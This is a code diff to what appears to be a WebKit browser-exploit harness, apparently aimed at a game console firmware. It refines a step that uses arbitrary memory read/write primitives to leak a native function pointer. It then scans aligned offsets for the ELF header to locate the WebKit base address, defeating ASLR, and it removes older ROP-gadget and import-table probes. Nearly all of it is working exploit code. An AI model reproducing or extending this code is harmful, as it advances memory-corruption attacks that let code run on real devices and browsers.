@@ -22,6 +22,13 @@ const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|ABORT|PASS|GIVE-UP|PRIMITIVE|ADDROF-FAI
 const LOG_MAX = 400;
 const STORAGE_KEY = "wk-userland-session-v1";
 const STORAGE_MAX = 500;
+const CAL_ALIGN_STEP = 0x4000;
+const CAL_DEFAULT_MIN = 0x1e00000;
+const CAL_DEFAULT_MAX = 0x4500000;
+const CAL_CHUNK_DEFAULT = 12;
+const CAL_YIELD_EVERY = 3;
+const CAL_YIELD_MS = 24;
+const CAL_MAX_CHUNKS_PER_CLICK = 2;
 
 let saveTimer = null;
 
@@ -241,6 +248,24 @@ function safeRead4(p, addr) {
     }
 }
 
+function parseNativeFnStr(str) {
+    if (!str) return null;
+    const s = String(str).trim().toLowerCase().replace(/^0x/, "");
+    if (!/^[0-9a-f]+$/.test(s)) return null;
+    if (s.length <= 8)
+        return new int64(parseInt(s, 16), 0);
+    const lo = parseInt(s.slice(-8), 16);
+    const hi = parseInt(s.slice(0, -8), 16);
+    return new int64(lo, hi);
+}
+
+function preCalTrim() {
+    if (lines.length > 10) {
+        lines.splice(0, lines.length - 10);
+        renderLog();
+    }
+}
+
 function captureNativeFn(p, mFunctionOff) {
     const cell = p.leakval(Math.expm1);
     const mid = read8p(p, cell.add32(0x18));
@@ -257,59 +282,47 @@ function captureNativeFn(p, mFunctionOff) {
 function nativeFnForOff(p, off) {
     if (probeCache && probeCache.nativeFn)
         return probeCache.nativeFn;
+    try {
+        const cached = parseNativeFnStr(sessionStorage.getItem("wk-nativeFn"));
+        if (cached) {
+            probeCache = { nativeFn: cached, mFunctionOff: off.wk_JSFunction_m_function || 0x28 };
+            return cached;
+        }
+    } catch (_) { }
     return captureNativeFn(p, off.wk_JSFunction_m_function || 0x28);
 }
 
 const ELF_MAGIC = 0x464c457f;
-const CAL_ALIGN_STEP = 0x4000;
-const CAL_DEFAULT_MIN = 0x1e00000;
-const CAL_DEFAULT_MAX = 0x4500000;
 
 function parseCalHex(name, fallback) {
     const v = parseInt(params.get(name) || "", 16);
     return v > 0 ? v : fallback;
 }
 
-/** Every 16 KiB-aligned delta where nativeFn - delta is module-aligned. */
-function alignedDeltaRange(nativeFn, minDelta, maxDelta) {
+function firstAlignedDelta(nativeFn, minDelta) {
     const residue = nativeFn.low & (CAL_ALIGN_STEP - 1);
     let d = minDelta >>> 0;
     const r = d & (CAL_ALIGN_STEP - 1);
     if (r !== residue)
         d = (d + ((residue - r + CAL_ALIGN_STEP) & (CAL_ALIGN_STEP - 1))) >>> 0;
-    const out = [];
-    for (; d <= maxDelta; d = (d + CAL_ALIGN_STEP) >>> 0)
-        out.push(d);
-    return out;
+    return d;
 }
 
-function tryElfAtDelta(p, nativeFn, delta, gadgetRva) {
+function countAlignedDeltas(nativeFn, minDelta, maxDelta) {
+    const first = firstAlignedDelta(nativeFn, minDelta);
+    if (first > maxDelta) return 0;
+    return Math.floor((maxDelta - first) / CAL_ALIGN_STEP) + 1;
+}
+
+function deltaAtIndex(nativeFn, minDelta, index) {
+    return (firstAlignedDelta(nativeFn, minDelta) + index * CAL_ALIGN_STEP) >>> 0;
+}
+
+function tryElfOnce(p, nativeFn, delta) {
     if (delta < 0) return null;
     const base = nativeFn.sub32(delta);
     if (!alignedWebkitBase(base)) return null;
     if (read4p(p, base) !== ELF_MAGIC) return null;
-    if (gadgetRva) {
-        const w = read4p(p, base.add32(gadgetRva));
-        if (w == null || (w & 0xffff) !== 0xc35f)
-            return null;
-    }
-    return { delta, base };
-}
-
-function tryGadgetAtDelta(p, nativeFn, delta, gadgetRva) {
-    if (delta < 0 || !gadgetRva) return null;
-    const base = nativeFn.sub32(delta);
-    if (!alignedWebkitBase(base)) return null;
-    const w = read4p(p, base.add32(gadgetRva));
-    if (w == null || (w & 0xffff) !== 0xc35f) return null;
-    return { delta, base };
-}
-
-function tryErrorImportAtDelta(p, nativeFn, delta, tableOff) {
-    if (delta < 0 || !tableOff.wk___imp___error) return null;
-    const base = nativeFn.sub32(delta);
-    if (!alignedWebkitBase(base)) return null;
-    if (!tryTableErrorImportDirect(p, base, tableOff)) return null;
     return { delta, base };
 }
 
@@ -327,78 +340,134 @@ function finishCalibrate(tableOff, mFunctionOff, delta, base, via) {
     } catch (_) { }
     mark("CAL-OK", via + " expm1=0x" + delta.toString(16) + " base=" + base);
     mark("PASTE-OFFSETS", JSON.stringify(live));
+    try { sessionStorage.removeItem("wk-cal-idx"); } catch (_) { }
+    try { sessionStorage.removeItem("wk-cal-hint"); } catch (_) { }
     return live;
 }
 
-function calibrateLiteSync(p, tableOff) {
+async function tryHintQuick(p, nativeFn, tableOff, mFunctionOff) {
+    const hint = tableOff.wk_expm1_builtin;
+    if (hint == null) return null;
+    for (let k = -4; k <= 12; k++) {
+        const delta = (hint + k * CAL_ALIGN_STEP) >>> 0;
+        const hit = tryElfOnce(p, nativeFn, delta);
+        if (hit)
+            return finishCalibrate(tableOff, mFunctionOff, hit.delta, hit.base,
+                "hint@0x" + hit.delta.toString(16));
+        if (k >= 0 && (k % CAL_YIELD_EVERY) === 0)
+            await new Promise(r => setTimeout(r, CAL_YIELD_MS));
+    }
+    return null;
+}
+
+async function calibrateOneChunk(p, tableOff, nativeFn, startIdx, chunkSize, calMin, calMax, total) {
     const mFunctionOff = tableOff.wk_JSFunction_m_function || 0x28;
-    const nativeFn = nativeFnForOff(p, mFunctionOff);
+    const endIdx = Math.min(startIdx + chunkSize, total);
+
+    for (let idx = startIdx; idx < endIdx; idx++) {
+        const n = idx - startIdx;
+        if (n > 0 && (n % CAL_YIELD_EVERY) === 0)
+            await new Promise(r => setTimeout(r, CAL_YIELD_MS));
+
+        const delta = deltaAtIndex(nativeFn, calMin, idx);
+        if (delta > calMax) break;
+
+        const hit = tryElfOnce(p, nativeFn, delta);
+        if (hit) {
+            return {
+                hit: finishCalibrate(tableOff, mFunctionOff, hit.delta, hit.base,
+                    "elf@0x" + hit.delta.toString(16))
+            };
+        }
+    }
+
+    if (endIdx >= total)
+        return { done: true, nextIdx: endIdx };
+
+    return { done: false, nextIdx: endIdx };
+}
+
+async function calibrateOffsets(p, tableOff) {
+    preCalTrim();
+    logQuiet++;
+    let live = null;
+    try {
+        live = await calibrateOffsetsInner(p, tableOff);
+    } finally {
+        logQuiet--;
+    }
+    saveSession();
+    return live;
+}
+
+async function calibrateOffsetsInner(p, tableOff) {
+    const nativeFn = nativeFnForOff(p, tableOff);
     if (!nativeFn) {
         mark("CAL-FAIL", "nativeFn unreadable");
         return null;
     }
-
     try {
         sessionStorage.setItem("wk-nativeFn", String(nativeFn));
     } catch (_) { }
 
+    if (params.get("calreset") === "1") {
+        try {
+            sessionStorage.removeItem("wk-cal-idx");
+            sessionStorage.removeItem("wk-cal-hint");
+        } catch (_) { }
+    }
+
+    if (sessionStorage.getItem("wk-cal-hint") !== "1") {
+        const quick = await tryHintQuick(p, nativeFn, tableOff,
+            tableOff.wk_JSFunction_m_function || 0x28);
+        try { sessionStorage.setItem("wk-cal-hint", "1"); } catch (_) { }
+        if (quick) return quick;
+    }
+
     const calMin = parseCalHex("calmin", CAL_DEFAULT_MIN);
     const calMax = parseCalHex("calmax", CAL_DEFAULT_MAX);
-    const chunkSize = parseInt(params.get("calchunk") || "0", 10) || 0;
-    const chunkOff = parseInt(params.get("caloff") || "0", 10) || 0;
-    const gadgetRva = tableOff.wk_POP_RDI_RET || 0x5c480;
+    const chunkSize = parseInt(params.get("calchunk") || String(CAL_CHUNK_DEFAULT), 10)
+        || CAL_CHUNK_DEFAULT;
+    const total = countAlignedDeltas(nativeFn, calMin, calMax);
 
-    const all = alignedDeltaRange(nativeFn, calMin, calMax);
-    const slice = chunkSize > 0
-        ? all.slice(chunkOff, chunkOff + chunkSize)
-        : all;
-
-    mark("CAL-SCAN", "nativeFn=" + nativeFn
-        + " align=0x" + (nativeFn.low & 0x3fff).toString(16)
-        + " range=0x" + calMin.toString(16) + "-0x" + calMax.toString(16)
-        + " tries=" + slice.length + (chunkSize ? "/" + all.length : ""));
-
-    for (let i = 0; i < slice.length; i++) {
-        if (i > 0 && (i % 128) === 0)
-            mark("CAL-PROG", i + "/" + slice.length);
-        const hit = tryElfAtDelta(p, nativeFn, slice[i], gadgetRva);
-        if (hit)
-            return finishCalibrate(tableOff, mFunctionOff, hit.delta, hit.base,
-                "elf@0x" + hit.delta.toString(16));
+    let startIdx = 0;
+    try {
+        startIdx = parseInt(sessionStorage.getItem("wk-cal-idx") || "0", 10) || 0;
+    } catch (_) { startIdx = 0; }
+    if (startIdx >= total) {
+        try { sessionStorage.removeItem("wk-cal-idx"); } catch (_) { }
+        startIdx = 0;
     }
 
-    mark("CAL-PHASE", "ELF miss — gadget POP_RDI @0x" + gadgetRva.toString(16));
-    for (let i = 0; i < slice.length; i++) {
-        const hit = tryGadgetAtDelta(p, nativeFn, slice[i], gadgetRva);
-        if (hit)
-            return finishCalibrate(tableOff, mFunctionOff, hit.delta, hit.base,
-                "gadget@0x" + hit.delta.toString(16));
-    }
+    let chunksRun = 0;
+    while (chunksRun < CAL_MAX_CHUNKS_PER_CLICK) {
+        mark("CAL-SCAN", "nativeFn=" + nativeFn
+            + " chunk=" + startIdx + "+" + chunkSize + "/" + total);
 
-    if (tableOff.wk___imp___error) {
-        mark("CAL-PHASE", "__error import probe");
-        for (let i = 0; i < slice.length; i++) {
-            const hit = tryErrorImportAtDelta(p, nativeFn, slice[i], tableOff);
-            if (hit)
-                return finishCalibrate(tableOff, mFunctionOff, hit.delta, hit.base,
-                    "error-imp@0x" + hit.delta.toString(16));
+        const chunk = await calibrateOneChunk(p, tableOff, nativeFn,
+            startIdx, chunkSize, calMin, calMax, total);
+        if (chunk.hit)
+            return chunk.hit;
+
+        if (chunk.done) {
+            try { sessionStorage.removeItem("wk-cal-idx"); } catch (_) { }
+            mark("CAL-FAIL", "range exhausted (" + total + " tries)");
+            mark("CAL-NATIVEFN", String(nativeFn));
+            mark("CAL-NEXT", "?calmax=0x5000000&calreset=1");
+            return null;
         }
+
+        startIdx = chunk.nextIdx;
+        try {
+            sessionStorage.setItem("wk-cal-idx", String(startIdx));
+        } catch (_) { }
+        chunksRun++;
+        if (startIdx >= total) break;
+        preCalTrim();
+        await new Promise(r => setTimeout(r, CAL_YIELD_MS * 2));
     }
 
-    const hint = tableOff.wk_expm1_builtin;
-    const hintBase = hint != null ? nativeFn.sub32(hint) : null;
-    const magic = hintBase ? read4p(p, hintBase) : null;
-    mark("CAL-FAIL", "miss after " + slice.length + " aligned tries");
-    mark("CAL-NATIVEFN", String(nativeFn));
-    if (hintBase)
-        mark("CAL-DIAG", "table-hint base=" + hintBase + " magic=0x"
-            + (magic == null ? "null" : magic.toString(16))
-            + " (table anchor wrong for this build — not a dump issue)");
-    if (chunkSize > 0 && chunkOff + chunkSize < all.length)
-        mark("CAL-NEXT", "retry with ?caloff=" + (chunkOff + chunkSize)
-            + "&calchunk=" + chunkSize);
-    else if (all.length >= slice.length && calMax < 0x5000000)
-        mark("CAL-NEXT", "widen with ?calmax=0x5000000");
+    mark("CAL-MORE", startIdx + "/" + total + " — tap step 3 again to continue");
     return null;
 }
 
@@ -463,22 +532,6 @@ function bufAddr(p, off, ab) {
     const impl = read8p(p, cell.add32(off.wk_ArrayBuffer_m_impl));
     if (!impl) return null;
     return read8p(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
-}
-
-async function calibrateOffsets(p, tableOff) {
-    if (lines.length > 25) {
-        lines.splice(0, lines.length - 25);
-        renderLog();
-    }
-    logQuiet++;
-    let live = null;
-    try {
-        live = calibrateLiteSync(p, tableOff);
-    } finally {
-        logQuiet--;
-    }
-    saveSession();
-    return live;
 }
 
 function logBootInfo() {
@@ -558,14 +611,15 @@ async function runEstablish() {
     p.write8(addrA, headerA);
     check("read8-write8-roundtrip-header", same64(p.read8(addrA), headerA), "");
 
-    const offKey = resolvedOffKey();
-    const { off } = offsetsForKey(offKey);
+    const { off: capOff } = offsetsForKey(resolvedOffKey());
+    if (capOff)
+        captureNativeFn(p, capOff.wk_JSFunction_m_function || 0x28);
 
     saveSession();
     state("primitive OK — run step 3 calibrate, then step 2 verify", "ok");
     mark("READY", "cal is step 3 (kept out of step 1 to avoid OOM)");
-    if (off)
-        mark("HINT", "after step 1 succeeds: step 3 calibrate (~600 read4), then step 2");
+    if (capOff)
+        mark("HINT", "step 3 = calibrate in tiny chunks — tap repeatedly until CAL-OK");
 }
 
 async function runOffsetTests() {
@@ -641,14 +695,27 @@ async function runCalibrate() {
     const { off } = offsetsForKey(offKey);
     if (!off) throw new Error("no offset table for fw=" + offKey);
 
-    mark("STEP", "3 - calibrate");
+    preCalTrim();
+    if (lines.length > 15) {
+        lines.splice(0, lines.length - 15);
+        renderLog();
+    }
+
+    mark("STEP", "3 - calibrate (16 tries/chunk, low memory)");
     state("calibrating...", "warn");
 
     const live = await calibrateOffsets(p, off);
 
     saveSession();
-    state(calibratedOff ? "calibrate done — run step 2" : "calibrate failed", calibratedOff ? "ok" : "warn");
-    mark("DONE-CALIBRATE", live ? "ok" : "fail");
+    if (calibratedOff) {
+        state("calibrate OK — run step 2 verify", "ok");
+    } else if (live) {
+        state("calibrate OK — run step 2 verify", "ok");
+    } else {
+        const more = sessionStorage.getItem("wk-cal-idx");
+        state(more ? "chunk done — tap step 3 again" : "calibrate failed", "warn");
+    }
+    mark("DONE-CALIBRATE", calibratedOff ? "ok" : (sessionStorage.getItem("wk-cal-idx") ? "more" : "fail"));
 }
 
 async function runLibkernelCheck() {
